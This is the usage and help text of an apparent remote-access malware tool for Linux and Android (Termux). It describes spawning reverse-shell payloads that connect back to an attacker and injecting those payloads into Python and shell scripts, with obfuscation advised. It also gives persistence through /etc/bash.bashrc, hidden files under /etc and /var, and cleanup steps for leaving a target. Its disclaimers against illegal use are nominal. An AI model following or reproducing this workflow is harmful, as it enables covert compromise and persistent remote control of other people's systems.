      target: Set target system, example: target linux, target termux (Windows payload is not available in this version, check github.com/Mahmoud7Osman/ for updates)



      vcs-spawn: Spawn a payload to connect back to attacker and start the reverse shell, example: vcs-spawn  payload.sh
 



      vcs-remove: Check if your system is infected with this virus and remove it: example: vcs-remove



      vcs-exploit: Start the exploit, example: vcs-exploit

      ipy: Inject shell payload in a python script, example: ipy  spawned_payload.sh  target_script.py  infected_python_file.py (it is better to obfuscate this file with compileall module in python)
                                                                  ------------------  ----------------  ------------------------

      ish: Inject shell payload in another shell script, example: ish   spawned_payload.sh  target_shell_script.sh   infected_shell_script.sh (the same as 'ipy')



      cls: Clear screen, example: cls

   
      
      help: get help, example: help       
     


      exit: exit vcs, example: exit



tips:
  
      - prepare target system with 'target' command, then set the address with 'vset' command, then spawn a payload with 'vcs-spawn' command. 
     
      - you can inject your payload in a python script with 'ipy', and in a shell script with 'ish' (you can obfuscate the malicious python script with 'compileall' lib)

      - the payload execution will be injected at '/etc/bash.bashrc' and the data at '/etc/system.cfg', to remove payload from your system type: vcs-remove. in the VCS console 

      - Do not use it for illegal purposes
      
      - Support exploiting android (termux) and all linux os, this tool run in termux and linux


Next version:
  
      - Windows exploit will be available in the next version

      - Machine code injection will be supported
   
      - Process injection will be supported

      - Automatic Proccess checker will be available


Warning:

     - Before leaving the session check processes with 'ps aux | grep .cfg' and kill running payloads.  

     - When you want to leave target system forever delete this files:
                    /etc/system.cfg
                    /var/sys.cfg*

     - Optionaly: You need to edit the /etc/bash.bashrc and remove the line that execute the payload


     - This tool is dangerous, please do not use it with illegal actions
